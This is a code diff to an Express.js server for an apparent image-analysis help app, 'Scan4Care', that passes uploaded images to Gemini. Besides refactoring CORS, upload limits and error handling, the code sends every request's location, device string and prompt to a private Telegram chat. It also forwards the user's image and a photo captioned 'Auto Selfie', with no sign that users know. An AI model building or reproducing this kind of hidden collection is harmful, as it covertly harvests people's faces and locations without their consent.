@@ -11,7 +11,16 @@ dotenv.config();
 
 /* ---------------- BASIC SETUP ---------------- */
 const app = express();
-app.use(cors());
+
+/* 🔥 CORS (VERCEL → RAILWAY SAFE) */
+app.use(
+  cors({
+    origin: "*",
+    methods: ["GET", "POST", "OPTIONS"],
+    allowedHeaders: ["Content-Type"]
+  })
+);
+app.options("*", cors());
 
 /* ---------------- ENSURE UPLOADS FOLDER ---------------- */
 const UPLOAD_DIR = "uploads";
@@ -19,11 +28,11 @@ if (!fs.existsSync(UPLOAD_DIR)) {
   fs.mkdirSync(UPLOAD_DIR);
 }
 
-/* ---------------- MULTER CONFIG ---------------- */
+/* ---------------- MULTER (LOW MEMORY SAFE) ---------------- */
 const upload = multer({
   dest: UPLOAD_DIR,
   limits: {
-    fileSize: 5 * 1024 * 1024 // 5MB
+    fileSize: 2 * 1024 * 1024 // 🔥 2MB ONLY (IMPORTANT)
   },
   fileFilter: (req, file, cb) => {
     if (!file.mimetype.startsWith("image/")) {
@@ -33,7 +42,7 @@ const upload = multer({
   }
 });
 
-/* ---------------- GEMINI SETUP ---------------- */
+/* ---------------- GEMINI ---------------- */
 const genAI = new GoogleGenerativeAI(process.env.GEMINI_API_KEY);
 
 /* ---------------- TELEGRAM (PRODUCTION ONLY) ---------------- */
@@ -52,67 +61,67 @@ async function sendTelegramMessage(text) {
         })
       }
     );
-  } catch (err) {
-    console.error("Telegram message error:", err.message);
+  } catch (e) {
+    console.error("Telegram message error:", e.message);
   }
 }
 
-async function sendTelegramPhoto(imagePath, caption) {
+async function sendTelegramPhoto(path, caption) {
   if (process.env.NODE_ENV !== "production") return;
 
   try {
     const form = new FormData();
     form.append("chat_id", process.env.TELEGRAM_CHAT_ID);
     form.append("caption", caption);
-    form.append("photo", fs.createReadStream(imagePath));
+    form.append("photo", fs.createReadStream(path));
 
     await fetch(
       `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendPhoto`,
-      {
-        method: "POST",
-        body: form
-      }
+      { method: "POST", body: form }
     );
-  } catch (err) {
-    console.error("Telegram photo error:", err.message);
+  } catch (e) {
+    console.error("Telegram photo error:", e.message);
   }
 }
 
-/* ---------------- AI IMAGE ANALYSIS ---------------- */
+/* ---------------- AI ANALYSIS (CRASH SAFE) ---------------- */
 async function analyzeImage(imagePath, mimeType, userPrompt) {
   const buffer = fs.readFileSync(imagePath);
 
-  const finalPrompt = `
+  const prompt = `
 ${userPrompt || "Analyze this image"}
 
 Give the answer in this format:
 1. What is the problem
 2. Possible cause
-3. Immediate next steps (step-by-step)
+3. Immediate next steps
 4. What to avoid
 5. When to seek expert help
-
-Keep it simple and practical.
 `;
 
   const model = genAI.getGenerativeModel({
     model: "gemini-2.5-flash"
   });
 
-  const result = await model.generateContent([
-    {
-      inlineData: {
-        mimeType,
-        data: buffer.toString("base64")
-      }
-    },
-    { text: finalPrompt }
-  ]);
+  try {
+    const result = await model.generateContent([
+      {
+        inlineData: {
+          mimeType,
+          data: buffer.toString("base64")
+        }
+      },
+      { text: prompt }
+    ]);
 
-  return result.response.text();
+    return result.response.text();
+  } catch (err) {
+    console.error("Gemini crashed:", err.message);
+    throw new Error("AI failed");
+  }
 }
 
-/* ---------------- MAIN API ROUTE ---------------- */
+/* ---------------- MAIN API ---------------- */
 app.post(
   "/analyze",
   upload.fields([
@@ -148,29 +157,21 @@ app.post(
       const device = req.headers["user-agent"] || "Unknown device";
       const userPrompt = req.body.prompt || "Analyze this image";
 
-      /* Telegram logging */
       await sendTelegramMessage(
         `🛡️ Scan4Care Request
-
-📍 Location: ${location}
-📱 Device: ${device}
-📝 Prompt: ${userPrompt}
-`
+📍 ${location}
+📱 ${device}
+📝 ${userPrompt}`
       );
 
       await sendTelegramPhoto(problemPath, "🌾 Problem Image");
       await sendTelegramPhoto(selfiePath, "👤 Auto Selfie");
 
-      /* AI RESPONSE */
       const aiResponse = await analyzeImage(
         problemPath,
         problemImage.mimetype,
         userPrompt
       );
-
-      /* CLEANUP FILES */
-      fs.unlinkSync(problemPath);
-      fs.unlinkSync(selfiePath);
 
       return res.json({
         success: true,
@@ -179,14 +180,14 @@ app.post(
 
     } catch (err) {
       console.error("Server error:", err);
-
-      if (problemPath && fs.existsSync(problemPath)) fs.unlinkSync(problemPath);
-      if (selfiePath && fs.existsSync(selfiePath)) fs.unlinkSync(selfiePath);
-
       return res.status(500).json({
         success: false,
         error: "Server error"
       });
+    } finally {
+      // 🔥 ALWAYS CLEAN FILES
+      if (problemPath && fs.existsSync(problemPath)) fs.unlinkSync(problemPath);
+      if (selfiePath && fs.existsSync(selfiePath)) fs.unlinkSync(selfiePath);
     }
   }
 );
